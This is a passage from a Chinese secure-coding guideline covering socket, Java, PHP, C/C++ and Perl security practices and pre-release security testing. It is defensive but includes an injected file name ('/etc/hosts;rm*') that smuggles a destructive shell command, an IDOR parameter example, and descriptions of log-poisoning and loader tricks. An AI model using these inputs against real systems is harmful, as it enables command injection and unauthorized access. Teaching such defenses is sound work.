口令要有一定的强度，应当满足系统的账号口令策略要求。</li></ul><h4 id="4-2-12-SOCKET网络编程安全基本要求"><a href="#4-2-12-SOCKET网络编程安全基本要求" class="headerlink" title="4.2.12 SOCKET网络编程安全基本要求"></a>4.2.12 SOCKET网络编程安全基本要求</h4><ul><li>1、 在socket函数调用时，明确参数中绑定的端口、IP地址和网卡接。Windows环境下，在遇到多个网卡的情况时，需要通过注册表来获得网卡接口和IP地址的信息，包括WindowsNT和windows2008。</li><li>2、 判断连接的合法身份。即，为防止恶意的连接以及可能是无效的连接，建议在socket连接期间，判断连接的对端是否是合法的真正的连接。</li><li>3、 对于UDP连接，可以获得连接对方的IP地址和端口，从而可以判断对方的有效性和合法性；对于TCP连接，由于每次连接需要三次握手，而且还有超时机制，存在两种方式来控制。</li><li>4、 对于TCP连接，需要尽量在三次握手完成前完成判断，同时防止端口扫描的攻击。</li><li>5、 尽可能确保socket应用能通过合理设置的防火墙。</li><li>6、 在可能的情况下，尽量减少socket连接数目。</li><li>7、 尽量不能使用回拨的技术。</li><li>8、 尽量采用有连接状态的协议，例如TCP协议。由于防火墙一般采取禁止一切的策略，对于UDP协议比较难以设置。</li><li>9、 在一个应用程序中，尽量使用同一种协议，不能使用多种协议。</li><li>10、尽量将客户端和服务器端的端口做成可以配置，不能硬编码在程序中。</li></ul><h3 id="4-3-JAVA安全开发要求"><a href="#4-3-JAVA安全开发要求" class="headerlink" title="4.3 JAVA安全开发要求"></a>4.3 JAVA安全开发要求</h3><p>JAVA语言安全规范参考OWASPTOP10要求，本指南列举了常见的JAVA开发安全要求。</p><h4 id="4-3-1-防范跨站脚本（XSS）"><a href="#4-3-1-防范跨站脚本（XSS）" class="headerlink" title="4.3.1 防范跨站脚本（XSS）"></a>4.3.1 防范跨站脚本（XSS）</h4><p>跨站脚本是最普遍的Web应用安全漏洞。当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当验证或转译，就容易导致跨站脚本漏洞。攻击者能在受害者浏览器中执行脚本以劫持用户会话、危害网站、插入恶意内容和重定向用户等。已知三种著名跨站漏洞是：1）存储式；2）反射式；3）基于DOM。反射式跨站脚本通过测试或代码分析很容易找到。<br>防范措施：</p><ul><li>1、 验证输入<br>检查每个输入的有效性，主要检查输入类型和数据的长度。</li><li>2、 编码输出<br>对验证输入的另一面就是编码输出。编码输出是指确保字符被视为数据，而不是作为HTML元字符被浏览器解析。这些技术定义一些特殊的“转义”字符，没有正确转义的数据它仍然会在浏览器中正确解析。编码输出只是让浏览器知道数据是不是要被解析，达到攻击无法实现的目的。需要编码的部分：HTML实体、HTML属性、JavaScript、CSS、URL。</li></ul><h4 id="4-3-2-防范SQL注入"><a href="#4-3-2-防范SQL注入" class="headerlink" title="4.3.2 防范SQL注入"></a>4.3.2 防范SQL注入</h4><p>简单来说，注入往往是应用程序缺少对输入进行安全性检查所引起的，攻击者把一些包含指令的数据发送给解释器，解释器把收到的数据转换成指令执行。注入漏洞十分普遍，通常能在SQL查询、LDAP查询、Xpath查询、OS命令、程序参数等中出现。注入能导致数据丢失或数据破坏、缺乏可审计性或是拒绝服务，注入漏洞有时甚至能导致完全接管主机。SQL注入包含了SQL注入、XPATH注入、LDAP注入、OS命令注入等。</p><h4 id="4-3-3-防范恶意文件执行"><a href="#4-3-3-防范恶意文件执行" class="headerlink" title="4.3.3 防范恶意文件执行"></a>4.3.3 防范恶意文件执行</h4><p>恶意文件执行是一种能够威胁任何网站形式的漏洞，只要攻击者在具有引入（include）功能程式的参数中修改参数内容，Web服务器便会引入恶意程序从而受到恶意文件执行漏洞攻击。<br>攻击者可利用恶意文件执行漏洞进行攻击取得Web服务器控制权，进行不法利益或获取经济利益。</p><h4 id="4-3-4-不安全的直接对象引用"><a href="#4-3-4-不安全的直接对象引用" class="headerlink" title="4.3.4 不安全的直接对象引用"></a>4.3.4 不安全的直接对象引用</h4><p>所谓“不安全的对象直接引用”，即Insecure direct object references，意指一个已经授权的用户，通过更改访问时的一个参数，从而访问到原本其并没有得到授权的对象。Web应用往往在生成Web页面时会用它的真实名字，且并不会对所有的目标对象访问时检查用户权限，所以这就造成了不安全的对象直接引用的漏洞。以下是不安全的对象直接引用示例：</p><ul><li style="list-style: none"><input type="checkbox"> 攻击者发现他自己的参数是6065，即?acct=6065；</li><li style="list-style: none"><input type="checkbox"> 他可以直接更改参数为6066，即?acct=6066；</li><li style="list-style: none"><input type="checkbox"> 这样他就可以直接看到6066用户的账户信息了；</li><li style="list-style: none"><input type="checkbox"> 这种漏洞能损害参数所引用的所有数据。除非名字空间很稀疏，否则攻击者很容易访问该类型的所有数据。</li></ul><h4 id="4-3-5-防范跨站请求伪造"><a href="#4-3-5-防范跨站请求伪造" class="headerlink" title="4.3.5 防范跨站请求伪造"></a>4.3.5 防范跨站请求伪造</h4><p>跨站请求伪造，也被称成为“one-click attack”或者session riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不太流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。<br>攻击者能让受害用户修改可以修改的任何数据，或者是执行允许使用的任何功能。</p><h4 id="4-3-6-信息泄露和错误处理不当"><a href="#4-3-6-信息泄露和错误处理不当" class="headerlink" title="4.3.6 信息泄露和错误处理不当"></a>4.3.6 信息泄露和错误处理不当</h4><p>应用程序常常产生错误信息并显示给使用者。很多时候，这些错误信息非常有用，因为它们揭示实施细则或有用的开发信息。泄露太多的细节（如错误堆栈跟踪信息、SQL语句等等）；</p><ul><li style="list-style: none"><input type="checkbox"> 登录失败后，通知用户是否用户ID或密码出错——登录失败可能是由于ID或密码错误造成的。这为一个对关键资产发动蛮力攻击的攻击者提供重要信息。</li></ul><h4 id="4-3-7-残缺的认证和会话管理"><a href="#4-3-7-残缺的认证和会话管理" class="headerlink" title="4.3.7 残缺的认证和会话管理"></a>4.3.7 残缺的认证和会话管理</h4><p>与认证和会话管理相关的应用程序功能往往得不到正确实施，这就导致攻击者破坏密码、密钥、会话令牌或利用实施漏洞冒充其他用户身份。<br>这些漏洞可能导致部分甚至全部账号遭受攻击。一旦攻击成功，攻击者能执行合法用户的任何操作，因此特权账号会造成更大的破坏。<br>编程要求：</p><ul><li style="list-style: none"><input type="checkbox"> 使用内置的会话管理功能；</li><li style="list-style: none"><input type="checkbox"> 通过认证的问候；</li><li style="list-style: none"><input type="checkbox"> 使用单一的入口点；</li><li style="list-style: none"><input type="checkbox"> 确保在一开始登录SSL保护的网页；</li><li style="list-style: none"><input type="checkbox"> 获取注销的权利；</li><li style="list-style: none"><input type="checkbox"> 添加超时；</li><li style="list-style: none"><input type="checkbox"> 确保你使用的是安全相关的功能；</li><li style="list-style: none"><input type="checkbox"> 使用强大的认证；</li><li style="list-style: none"><input type="checkbox"> 不进行默认身份验证。</li></ul><h4 id="4-3-8-不安全的加密存储"><a href="#4-3-8-不安全的加密存储" class="headerlink" title="4.3.8 不安全的加密存储"></a>4.3.8 不安全的加密存储</h4><p>保护敏感数据已经成为网络应用的最重要的组成部分，加密的敏感数据已是非常常见安全保护手段。不加密的应用程序、设计不当或者使用不恰当的密码技术等可能导致披露敏感数据。</p><ul><li style="list-style: none"><input type="checkbox"> 攻击者能够取得或是篡改机密的或是私有的信息；</li><li style="list-style: none"><input type="checkbox"> 攻击者通过机密秘密的窃取从而进行进一步的攻击；</li><li style="list-style: none"><input type="checkbox"> 造成企业形象破损，用户满意度下降，甚至面临法律诉讼等。编程要求：</li><li style="list-style: none"><input type="checkbox"> 验证你的结构；</li><li style="list-style: none"><input type="checkbox"> 识别所有的敏感数据；</li><li style="list-style: none"><input type="checkbox"> 识别敏感数据存放的所有位置；</li><li style="list-style: none"><input type="checkbox"> 确保所应用的威胁模型能够应付这些攻击；</li><li style="list-style: none"><input type="checkbox"> 使用加密手段来应对威胁；</li><li style="list-style: none"><input type="checkbox"> 使用一定的机制来进行保护</li><li style="list-style: none"><input type="checkbox"> 文件加密；</li><li style="list-style: none"><input type="checkbox"> 数据库加密；</li><li style="list-style: none"><input type="checkbox"> 数据元素加密；</li><li style="list-style: none"><input type="checkbox"> 正确的使用这些机制；</li><li style="list-style: none"><input type="checkbox"> 使用标准的强算法；</li><li style="list-style: none"><input type="checkbox"> 合理的生成，分发和保护密钥；</li><li style="list-style: none"><input type="checkbox"> 准备密钥的变更；</li><li style="list-style: none"><input type="checkbox"> 验证实现方法；</li><li style="list-style: none"><input type="checkbox"> 确保所有的证书、密钥和密码都得到了安全的存放；</li><li style="list-style: none"><input type="checkbox"> 有一个安全的密钥分发和应急处理的方案。</li></ul><h4 id="4-3-9-不安全的通信"><a href="#4-3-9-不安全的通信" class="headerlink" title="4.3.9 不安全的通信"></a>4.3.9 不安全的通信</h4><p>对于不加密的应用程序的网络信息传输，需要保护敏感的通信。加密（通常SSL）必须用于所有身份验证的连接，特别是通过Internet访问的网页，以及后端的连接。否则，应用程序将暴露身份验证或会话令牌。</p><ul><li style="list-style: none"><input type="checkbox"> 攻击者能够取得或是篡改机密的或是私有的信息；</li><li style="list-style: none"><input type="checkbox"> 攻击者通过这些秘密的窃取从而进行进一步的攻击；</li><li style="list-style: none"><input type="checkbox"> 造成企业形象破损，用户满意度下降，甚至面临法律诉讼等。</li><li style="list-style: none"><input type="checkbox"> 编程要求：</li><li style="list-style: none"><input type="checkbox"> 提供合理的保护机制；</li><li style="list-style: none"><input type="checkbox"> 对于敏感数据的传输，对所有连接都要使用TLS；</li><li style="list-style: none"><input type="checkbox"> 在传输前对单个数据都要进行加密；（如XML-Encryption）；</li><li style="list-style: none"><input type="checkbox"> 在传输前对信息进行签名；（如XML-Signature）；</li><li style="list-style: none"><input type="checkbox"> 正确的使用这些机制；</li><li style="list-style: none"><input type="checkbox"> 使用标准的强算法；</li><li style="list-style: none"><input type="checkbox"> 合理管理密钥和证书；</li><li style="list-style: none"><input type="checkbox"> 在使用前验证SSL证书。</li></ul><h4 id="4-3-10-限制URL访问失效"><a href="#4-3-10-限制URL访问失效" class="headerlink" title="4.3.10 限制URL访问失效"></a>4.3.10 限制URL访问失效</h4><p>这个漏洞事实上也是与认证相关的，与我们前面提到的不安全的直接对象引用也是类似的，不同在于这个漏洞是指系统已经对URL的访问做了限制，但这种限制却实际并没有生效。常见的错误是，我们在用户认证后只显示给用户认证过的页面和菜单选项，而实际上这些仅仅是表示层的访问控制而不能真正生效，攻击者能够很容易伪造请求直接访问未被授权的页面。<br>编程要求：</p><ul><li style="list-style: none"><input type="checkbox"> 如果URL不是公开的，那么必须限制能够访问的授权用户；</li><li style="list-style: none"><input type="checkbox"> 加强基于用户或角色的访问控制；</li><li style="list-style: none"><input type="checkbox"> 完全禁止访问未被授权的页面类型（如配置文件、日志文件、源文件等）；</li><li style="list-style: none"><input type="checkbox"> 验证你的构架；</li><li style="list-style: none"><input type="checkbox"> 在每一个层次都使用简单肯定的模型；</li><li style="list-style: none"><input type="checkbox"> 确保每一层都有一个访问机制；</li><li style="list-style: none"><input type="checkbox"> 验证你的实现；</li><li style="list-style: none"><input type="checkbox"> 不能使用自动化的分析工具；</li><li style="list-style: none"><input type="checkbox"> 确保每个URL都被外部过滤器或其他机制保护；</li><li style="list-style: none"><input type="checkbox"> 确保服务器的配置不允许对非授权页面的访问。</li></ul><h3 id="4-4-PHP安全开发要求"><a href="#4-4-PHP安全开发要求" class="headerlink" title="4.4 PHP安全开发要求"></a>4.4 PHP安全开发要求</h3><h4 id="4-4-1-变量滥用"><a href="#4-4-1-变量滥用" class="headerlink" title="4.4.1 变量滥用"></a>4.4.1 变量滥用</h4><p>PHP-4.1.0发布的时候建议关闭register_globals，并提供了7个特殊的数组变量来使用各种变量。对于从GET、POST、COOKIE等来的变量并不会直接注册成变量，必需通过数组变量来存取。PHP-4.2.0发布的时候，php.ini默认配置就是<code>register_globals=Off</code>。这使得程序使用PHP自身初始化的默认值，一般为0，避免了攻击者控制判断变量。通过以下解决方法实现：<br>配置文件php.ini设置<code>register_globals=Off</code>。<br>要求程序员对作为判断的变量在程序最开始初始化一个值。</p><h4 id="4-4-2-文件打开"><a href="#4-4-2-文件打开" class="headerlink" title="4.4.2 文件打开"></a>4.4.2 文件打开</h4><p>如非特殊需要，把php的文件操作限制在Web目录里面。以下是修改apache配置文件httpd.conf的一个例子：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory/usr/local/apache/htdocs&gt;</span><span class="attribute">php_admin_valueopen_basedir</span>/usr/local/apache/htdocs</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure></p><p>重启apache后，/usr/local/apache/htdocs目录下的PHP脚本就只能操作它自己目录下的文件了，否则PHP就会报错：<br><code>Warning:open_basedirrestrictionineffect.Fileisinwrongdirectoryinxxxonlinexx.</code><br>使用safe_mode模式也能避免这种问题，前面已经讨论过。</p><h4 id="4-4-3-文件包含"><a href="#4-4-3-文件包含" class="headerlink" title="4.4.3 文件包含"></a>4.4.3 文件包含</h4><p>要求程序员包含文件里的参数尽量不能使用变量，如果使用变量，就一定要严格检查要包含的文件名，绝对不能由用户任意指定。如前面文件打开中限PHP操作路径是一个必要的选项。另外，如非特殊需要，一定要关闭PHP的远程文件打开功能。修改php.ini文件：<br><code>allow_url_fopen=Off</code><br>重启apache。</p><h4 id="4-4-4-文件上传"><a href="#4-4-4-文件上传" class="headerlink" title="4.4.4 文件上传"></a>4.4.4 文件上传</h4><p>PHP-4.0.3以后提供了is_uploaded_file和move_uploaded_file函数，可以检查操作的文件是否是用户上传的文件，从而避免把系统文件拷贝到Web目录。<br>使用$HTTP_POST_FILES或$_FILES数组来读取用户上传的文件变量。严格检查上传变量。比如不允许是php脚本文件。把PHP脚本操作限制在Web目录可以避免程序员使用copy函数把系统文件拷贝到Web目录。move_uploaded_file不受open_basedir的限制，所以不必修改php.ini里upload_tmp_dir的值。把PHP脚本用phpencode进行加密，避免由于copy操作泄漏源码。严格配置文件和目录的权限，只允许上传的目录能够让nobody用户可写。<br>对于上传目录去掉PHP解释功能，可以通过修改httpd.conf实现：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory/usr/local/apache/htdocs/upload&gt;</span><span class="attribute">php_flagengineoff</span></span><br><span class="line"><span class="comment">#如果是php3换成php3_engineoff</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure></p><p>重启apache，upload目录的php文件就不能被apache解释了，即使上传了php文件也没有问题，只能直接显示源码。</p><h4 id="4-4-5-命令执行"><a href="#4-4-5-命令执行" class="headerlink" title="4.4.5 命令执行"></a>4.4.5 命令执行</h4><p>解决方法：<br>要求程序员使用escapeshellcmd()函数过滤用户输入的shell命令。启用safe_mode可以杜绝很多执行命令的问题，不过要注意PHP的版本一定要是最新的，小于PHP-4.2.2的都可能绕过safe_mode的限制去执行命令。<br>变量类型缺陷逻辑比较时注意变量类型。<br>必要的时候使用”===”，那么连变量类型一起比较。</p><h4 id="4-4-6-警告及错误信息"><a href="#4-4-6-警告及错误信息" class="headerlink" title="4.4.6 警告及错误信息"></a>4.4.6 警告及错误信息</h4><p>修改php.ini中关于Errorhandlingandlogging部分内容：<br><code>error_reporting=E_ALLdisplay_errors=Offlog_errors=Onerror_log=/usr/local/apache/logs/php_error.log</code><br>然后重启apache，注意文件/usr/local/apache/logs/php_error.log，必需可<br>以让nobody用户可写。</p><h4 id="4-4-7-PHP与MySQL组合的SQL注入"><a href="#4-4-7-PHP与MySQL组合的SQL注入" class="headerlink" title="4.4.7 PHP与MySQL组合的SQL注入"></a>4.4.7 PHP与MySQL组合的SQL注入</h4><p>解决方法：<br>要求程序员对所有用户提交的要放到SQL语句的变量进行过滤。<br>即使是数字类型的字段，变量也要用单引号扩起来，MySQL自己会把字串处理成数字。<br>在MySQL里不能给PHP程序高级别权限的用户，只允许对自己的库进行操作。</p><h4 id="4-4-8-跨站脚本"><a href="#4-4-8-跨站脚本" class="headerlink" title="4.4.8 跨站脚本"></a>4.4.8 跨站脚本</h4><p>解决方法：<br>确认输入<br>strip_tags()<br>htmlspecialchars()<br>清除危险的插入点。</p><h4 id="4-4-9-禁用无用的函数"><a href="#4-4-9-禁用无用的函数" class="headerlink" title="4.4.9 禁用无用的函数"></a>4.4.9 禁用无用的函数</h4><p>如果觉得有些函数还有威胁，可以设置php.ini里的disable_functions（这个选项不能在httpd.conf里设置），比如：<code>disable_functions=phpinfo,get_cfg_var</code><br>可以指定多个函数，用逗号分开。重启apache后，phpinfo,get_cfg_var函数都被禁止了。建议关闭函数phpinfo,get_cfg_var，这两个函数容易泄漏服务器信息，而且没有实际用处。</p><h4 id="4-4-10-禁用某些类"><a href="#4-4-10-禁用某些类" class="headerlink" title="4.4.10 禁用某些类"></a>4.4.10 禁用某些类</h4><p>这个选项是从PHP-4.3.2开始才有的，它可以禁用某些类，如果有多个用逗号分隔类名。disable_classes也不能在httpd.conf里设置，只能在php.ini配置文件里修改。</p><h4 id="4-4-11-限制脚本操作路径"><a href="#4-4-11-限制脚本操作路径" class="headerlink" title="4.4.11 限制脚本操作路径"></a>4.4.11 限制脚本操作路径</h4><p>前面分析例程的时候也多次提到用open_basedir对脚本操作路径进行限制，这里再介绍一下它的特性。用open_basedir指定的限制实际上是前缀，不是目录名。也就是说<code>open_basedir=/dir/incl</code>也会允许访问<code>/dir/include</code>和<code>/dir/incls</code>，如果它们存在的话。如果要将访问限制在仅为指定的目录，用斜线结束路径名。例如：<code>open_basedir=/dir/incl/</code>。<br>可以设置多个目录，在Windows中，用分号分隔目录。在任何其它系统中用冒号分隔目录。作为Apache模块时，父目录中的open_basedir路径自动被继承。</p><h4 id="4-4-12-其他安全配置"><a href="#4-4-12-其他安全配置" class="headerlink" title="4.4.12 其他安全配置"></a>4.4.12 其他安全配置</h4><ul><li>1、 取消其它用户对常用、重要系统命令的读写执行权限</li><li style="list-style: none"><input type="checkbox"> 一般管理员维护只需一个普通用户和管理用户，除了这两个用户，给其它用户能够执行和访问的东西应该越少越好，所以取消其它用户对常用、重要系统命令的读写执行权限能在程序或者服务出现漏洞的时候给攻击者带来很大的迷惑。记住一定要连读的权限也去掉，否则在linux下可以用/lib/ld-linux.so.2/bin/ls这种方式来执行。</li><li style="list-style: none"><input type="checkbox"> 如果要取消程序如果是在chroot环境里，这个工作比较容易实现，否则，这项工作还是有些挑战的。因为取消一些程序的执行权限会导致一些服务运行不正常。PHP的mail函数需要/bin/sh去调用sendmail发信，所以/bin/bash的执行权限不能去掉。</li><li>2、 去掉apache日志其它用户的读权限：<br>apache的access-log给一些出现本地包含漏洞的程序提供了方便之门。通过提交包含PHP代码的URL，可以使access-log包含PHP代码，那么把包含文件指向access-log就可以执行那些PHP代码，从而获得本地访问权限；</li><li style="list-style: none"><input type="checkbox"> 如果有其它虚拟主机，也应该相应去掉该日志文件其它用户的读权限；</li><li style="list-style: none"><input type="checkbox"> 当然，如果你按照前面介绍的配置PHP那么一般已经是无法读取日志文件了。</li><li>3、 保持运行环境干净。</li><li>4、 不能在Web目录放测试文件。</li></ul><h3 id="4-5-C-C-安全开发要求"><a href="#4-5-C-C-安全开发要求" class="headerlink" title="4.5 C/C++安全开发要求"></a>4.5 C/C++安全开发要求</h3><p>C本质上是不安全的编程语言。例如如果不谨慎使用的话，其大多数标准的字符串库函数有可能被用来进行缓冲区攻击或者格式字符串攻击。但是，由于其灵活性、快速和相对容易掌握，它是一个广泛使用的编程语言。下面是针对开发安全的C语言程序的一些规范。</p><h4 id="4-5-1-缓冲区溢出"><a href="#4-5-1-缓冲区溢出" class="headerlink" title="4.5.1 缓冲区溢出"></a>4.5.1 缓冲区溢出</h4><p>避免使用不执行边界检查的字符串函数，因为它们可能被用来进行缓冲区溢出攻击。下面是应该避免使用的函数。同时，也列出了每个函数相应的比较安全的替换方式。</p><ul><li style="list-style: none"><input type="checkbox"> 不使用strcpy()，使用strncpy()；</li><li style="list-style: none"><input type="checkbox"> 不使用strcat()，使用strncat()；</li><li style="list-style: none"><input type="checkbox"> 不使用sprintf()，使用snprintf()；</li><li style="list-style: none"><input type="checkbox"> 不使用gets()，使用fgets()。<br>在上面的前三个中函数中，每个替代函数的“n”表示了使用的缓冲区的大小。最后一个函数的“f”，表示格式，它允许用户指定期望的输入的格式。这些替换方程强制程序员定义使用的缓冲区的尺寸以及确定输入的类型。</li></ul><h4 id="4-5-2-格式化字符串攻击"><a href="#4-5-2-格式化字符串攻击" class="headerlink" title="4.5.2 格式化字符串攻击"></a>4.5.2 格式化字符串攻击</h4><p>该类攻击往往与缓冲区溢出相关，因为它们主要利用了某些函数的假设，例如sprintf()和vsprintf()假设缓冲区的长度是无限的。然而即使使用snprintf()替换sprintf()也无法完全保护程序不受格式化字符串的攻击。这些攻击通过直接将格式说明符（formatspecifiers）(%d，%s，%n等)传递到输出函数接收缓冲区来进行。<br>例如，以下的代码就是不安全的snprintf(buffer,sizeof(buffer),string)这种情况下，可以在字符串中插入格式说明符来操纵内存的栈，来写入攻击者的数据（这些数据中包含小的程序代码，并可由处理器接着执行）。对以上的例子建议使用下面的代码。<br>snprintf(buffer,sizeof(buffer),“%s”,string)进行格式字符串攻击不太容易。首先攻击者必须能获得内存栈的内容情况（或者从应用导出或者使用调试器），然后必须知道如何精确访问特定的内存空间来操纵栈中的变量。<br>执行外部程序推荐使用exec()函数而不是system()函数来执行外部程序。这是因为system()接收整个命令行的随机的缓冲区来执行程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">snprintf(buffer,sizeof(buffer),&quot;emacs%s&quot;,filename);</span><br><span class="line">system(buffer);</span><br></pre></td></tr></table></figure></p><p>在以上的例子中，可以通过使用分号利用文件名变量在sehll中插入额外的命令（例如文件名可以是/etc/hosts;rm*，这将在显示/etc/hosts目录文件的同时，删除目录中的所有文件）。而exec()函数只保证第一个参数被执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execl(&quot;usr/bin/emacs&quot;,&quot;usr/bin/emacs&quot;,filename,NULL);</span><br></pre></td></tr></table></figure></p><p>上面的例子保证文件名仅仅作为一个参数输入Emacs工具，同样它在Emacs命令中使用完全的路径而不是使用可以被攻击者利用的PATH环境变量。</p><h4 id="4-5-3-竞争条件"><a href="#4-5-3-竞争条件" class="headerlink" title="4.5.3 竞争条件"></a>4.5.3 竞争条件</h4><p>进程需要访问资源时（无论是磁盘、内存或是文件）通常需要执行两个步骤：</p><ul><li>1、首先测试资源是否空闲可用；</li><li>2、如果可用，就访问该资源，否则它等到资源不再使用为止再去访问它。当另一个进程在步骤1和2之间想要访问同一个资源时就出现问题了。<br>这会导致不可预测的结果。进程可能会被锁定，或者一个进程劫持获得了另一个进程的较大的权限而导致安全问题。攻击主要集中在有较大权限的程序上（称为setuid程序）。竞争条件攻击通常利用程序执行时可以访问到的资源。另外权限低的程序也存在安全风险，因为攻击者可能会等待有较高权限的用户执行那个程序(例如root)，然后进行攻击。<br>下面的建议有助于缓解竞争条件(racecondition)攻击：<br>在进行文件操作时，利用那些使用文件描述符的函数而不能使用那些使用文件路径的函数（例如使用fdopen()而不能使用fopen()）。文件描述符使得恶意的用户在文件打开时或是在原始的进程对文件进行操作前，无法使用文件连接（符号式的或是物理的）来改变文件。<br>在写文件甚至在读文件时使用fcntl()和flock()函数来对文件加锁，这样它们就不能被其他进程访问。它几乎可以建立原子级的操作。<br>谨慎操纵临时文件，因为它往往会导致竞争条件。</li></ul><h4 id="4-5-4-检验有效的返回值"><a href="#4-5-4-检验有效的返回值" class="headerlink" title="4.5.4 检验有效的返回值"></a>4.5.4 检验有效的返回值</h4><p>检验有效的返回值非常重要。一个例子是旧的/bin/login的实现中不检验错误的返回值，导致当它找不到/etc/passwd文件时返回root的访问权限。如果该文件损坏了，那么这种情况是合理的，但如果该文件存在只是无法访问，那么这就是一个大问题。</p><h3 id="4-6-Perl安全开发要求"><a href="#4-6-Perl安全开发要求" class="headerlink" title="4.6 Perl安全开发要求"></a>4.6 Perl安全开发要求</h3><p>多年以来，Perl已经成为用于系统管理和WebCGI开发的功能最强的编程语言之一（几乎可以使用Perl做任何功能的程序）。但其扩展应用，即作为Internet上CGI的开发工具，使得它经常成为Web服务器上的攻击目标。<br>另外，大多数CGI脚本有着比一般用户更高的权限，导致它更容易受攻击。下面列举了一些开发者（特别是CGI程序员）可以使用的主动的预防性的措施来增强Perl代码的整体安全性（请注意：这不是Web服务器CGI脚本安全性的指导原则）。</p><h4 id="4-6-1-Taint验证"><a href="#4-6-1-Taint验证" class="headerlink" title="4.6.1 Taint验证"></a>4.6.1 Taint验证</h4><p>Perl版本5.x包含一个叫做TaintChecking的数据验证措施。如果起用该功能，将不允许通过用户输入（任何程序外的输入）来操纵其他的外部程序（例如通过管道将数据导入另一个程序执行））。一般而言，程序员不能信任输入脚本和程序的数据（叫做Tainted数据），因为无法保证它不会产生危害（有意或者无意的）。Taint验证可以通过在命令行参数加入“-T”来开启。<br>例如：你可以在Perl脚本的第一行这样加入“-T”：<br><code>#!usr/bin/perl5-T</code><br>Tainted数据包括命令行参数、环境变量和来自文件的数据。引用tainted<br>数据的变量也称为tainted数据。如果脚本试图通过不安全的方式来使用tainted数据会产生一个致命错误（对这种情况称为“不安全的依赖”(Insecuredependency)或者其他的说法）。启用tainted验证在有些情况下会导致脚本停止运行，常常是由于Perl解释器要求所有脚本引用的外部程序的完全路径必须在PATH环境变量中列出，同时PATH中包含的每个目录除了目录的所有者及相应的所有者用户组外无法修改。Taint验证对于环境比较敏感，但是只要可能的话，应该使用taint验证，特别是代码执行其他程序功能时（例如在CGI脚本的情况下）。</p><h4 id="4-6-2-安全模块"><a href="#4-6-2-安全模块" class="headerlink" title="4.6.2 安全模块"></a>4.6.2 安全模块</h4><p>如果不但输入数据不可信而且实际的代码也不可信，例如用户从网站上下载了一个ActiveX控件，而它实际是一个特洛伊木马(Trojanhorse)。这种情况下taint验证就不起作用。安全模块让程序员可以在Perl脚本中将不同的代码模块与安全对象联系。每个安全对象对于运行的每块代码建立了一个限制的环境。这与chroot在一个进程中只能在整体目录结构的一个子目录中运行类似。而saft对象限制perl代码只能在perl包结构的某些特定包中运行。如何使用安全模式超出了本文的范围，但是程序员应该在任何时候尽量使用这一功能。</p><h4 id="4-6-3-警告参数"><a href="#4-6-3-警告参数" class="headerlink" title="4.6.3 警告参数"></a>4.6.3 警告参数</h4><p>使用-w参数可以在Perl解释脚本时显示所有的警告信息。警告可以在以下情况产生：只使用了一次的变量或者完全没有使用过得变量，未定义的文件句柄，未关闭的文件句柄，或者将非数值变量传递到数据变量。该功能不是针对安全处理的，但是可以有助于调试直接或者间接对安全有危害的错误。一般推荐总是使用-w参数。可以在taint验证时在第一行这样使用-w参数：<br><code>#!usr/bin/perl5-Tw</code></p><h2 id="5、-应用系统测试安全"><a href="#5、-应用系统测试安全" class="headerlink" title="5、 应用系统测试安全"></a>5、 应用系统测试安全</h2><p>应用系统在正式上线前应对安全性进行测试，验证应用系统的安全性是否符合安全设计及安全需求，应用系统的安全测试包括以下内容：</p><h3 id="5-1-测试前的要求"><a href="#5-1-测试前的要求" class="headerlink" title="5.1 测试前的要求"></a>5.1 测试前的要求</h3><p>测试之前，首先要确定测试大纲，在测试大纲中应当明确应用安全方面的测试内容、手段及方案（即测试用例）。包括：</p><ul><li style="list-style: none"><input type="checkbox"> 安全性测试的环境要求；</li><li style="list-style: none"><input type="checkbox"> 安全性测试软件、测试设备要求；</li><li style="list-style: none"><input type="checkbox"> 安全性测试人员要求；</li><li style="list-style: none"><input type="checkbox"> 安全性测试的时间要求；</li><li style="list-style: none"><input type="checkbox"> 安全性测试的内容；</li><li style="list-style: none"><input type="checkbox"> 安全性测试的输入数据；?安全性测试的预期结果；</li><li style="list-style: none"><input type="checkbox"> 安全性测试的详细过程；</li><li style="list-style: none"><input type="checkbox"> 安全性测试的风险和风险规避方案。<br>测试大纲中安全性方面的描述是进行安全性测试的一个重要依据。大纲内容的编写应当依据应用系统需求说明书及应用系统设计说明书中，有关安全方面的内容来编写相应的测试用例。</li></ul><h3 id="5-2-测试方法及内容要求"><a href="#5-2-测试方法及内容要求" class="headerlink" title="5.2 测试方法及内容要求"></a>5.2 测试方法及内容要求</h3><ul><li>1、 应根据应用系统的具体情况，设计安全性测试的具体方法和内容，通常主要的测试方法和内容分为功能性测试、压力测试、渗透性测试、审核性测试。</li><li>2、 功能性测试要求：对应用系统的安全功能点进行测试，确保安全功能的有效性、正确性。</li><li style="list-style: none"><input type="checkbox"> 这些功能点应全部包含在测试大纲中，在大纲的测试用例中体现具体的测试方法。测试大纲中的这些内容应当覆盖了需求说明书中安全功能部分的要求。</li><li style="list-style: none"><input type="checkbox"> 测试的具体内容主要涉及以下几个方面：</li><li style="list-style: none"><input type="checkbox"> 安全审计</li><li style="list-style: none"><input type="checkbox"> 通信安全</li><li style="list-style: none"><input type="checkbox"> 数据保护</li><li style="list-style: none"><input type="checkbox"> 身份认证</li><li style="list-style: none"><input type="checkbox"> 容错及资源分配方面的要求</li><li>3、 压力测试：对应用系统的安全功能进行压力测试，确保安全功能可以满足设计的需要。</li><li style="list-style: none"><input type="checkbox"> 压力测试的具体应全部包含在测试大纲中，在大纲的测试用例中体现具体的测试方法。</li><li style="list-style: none"><input type="checkbox"> 